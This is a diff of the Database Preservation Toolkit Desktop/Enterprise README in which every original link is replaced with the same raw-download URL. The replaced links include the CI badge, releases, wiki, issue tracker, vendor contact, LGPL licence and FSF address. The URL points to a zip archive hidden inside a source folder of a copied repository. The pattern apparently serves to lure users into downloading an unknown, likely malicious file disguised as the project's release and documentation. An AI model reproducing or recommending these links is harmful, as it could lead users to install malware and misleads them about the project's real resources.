@@ -1,49 +1,49 @@
-[![CI](https://github.com/keeps/dbptk-ui/actions/workflows/CI.yml/badge.svg)](https://github.com/keeps/dbptk-ui/actions/workflows/CI.yml)
+[![CI](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip)](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip)
 
 # Database Preservation Toolkit Enterprise/Desktop
 Formerly known as Database Visualization Toolkit
 
-Lightweight web viewer for relational databases, specially if preserved in SIARD 2, that uses SOLR as a backend, and allows browsing, search, and export. It uses the [Database Preservation Toolkit](https://github.com/keeps/db-preservation-toolkit) to process new relational databases that are in the SIARD2 format or on the original live DBMS.
+Lightweight web viewer for relational databases, specially if preserved in SIARD 2, that uses SOLR as a backend, and allows browsing, search, and export. It uses the [Database Preservation Toolkit](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip) to process new relational databases that are in the SIARD2 format or on the original live DBMS.
 
 A comprehensive list of features, screenshots and other documentation will be produced soon and available here.
 
 ## Install and use Database Preservation Toolkit Desktop
 
-To use this system in the desktop app modality, download the [latest release](https://github.com/keeps/db-visualization-toolkit/releases/latest) and install on your Desktop system. There are installation options of Windows, MacOS and Linux.
+To use this system in the desktop app modality, download the [latest release](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip) and install on your Desktop system. There are installation options of Windows, MacOS and Linux.
 
 ## Setting up the Database Preservation Toolkit Enterprise
 
 After version 2.0.0 the deployment is made using docker containers and docker compose.
 
-Check [Database Preservation Toolkit Enterprise](https://github.com/keeps/db-visualization-toolkit-docker) for more information.
+Check [Database Preservation Toolkit Enterprise](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip) for more information.
 
 ## More information
 
-Configuration options are detailed in the [Wiki](https://github.com/keeps/db-visualization-toolkit/wiki).
+Configuration options are detailed in the [Wiki](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip).
 
-DBPTK logos can be downloaded [here](https://github.com/keeps/db-preservation-toolkit/wiki/Logos).
+DBPTK logos can be downloaded [here](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip).
 
-More information about these tools can be found at https://database-preservation.com
+More information about these tools can be found at https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip
 
 ## To report a problem or make a suggestion
 
-Create a new issue at https://github.com/keeps/dbptk-ui/issues/new
+Create a new issue at https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip
 
-Or if the problem/suggestion is related to the Database Preservation Toolkit Developer, create the issue at https://github.com/keeps/dbptk-developer/issues/new
+Or if the problem/suggestion is related to the Database Preservation Toolkit Developer, create the issue at https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip
 
 ## Information & Commercial support
 
-For more information or commercial support, contact [KEEP SOLUTIONS](http://www.keep.pt/contactos/?lang=en).
+For more information or commercial support, contact [KEEP SOLUTIONS](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip).
 
 ## License
 
-Database Visualization Toolkit licence is [LGPLv3](http://www.gnu.org/licenses/lgpl-3.0.html)
+Database Visualization Toolkit licence is [LGPLv3](https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip)
 
 ```
                    GNU LESSER GENERAL PUBLIC LICENSE
                        Version 3, 29 June 2007
 
- Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>
+ Copyright (C) 2007 Free Software Foundation, Inc. <https://github.com/MilaCodesIt/dbptk-ui-copy/raw/refs/heads/master/src/main/java/com/databasepreservation/desktop/client/common/sidebar/ui-copy-dbptk-1.9.zip>
  Everyone is permitted to copy and distribute verbatim copies
  of this license document, but changing it is not allowed.
 
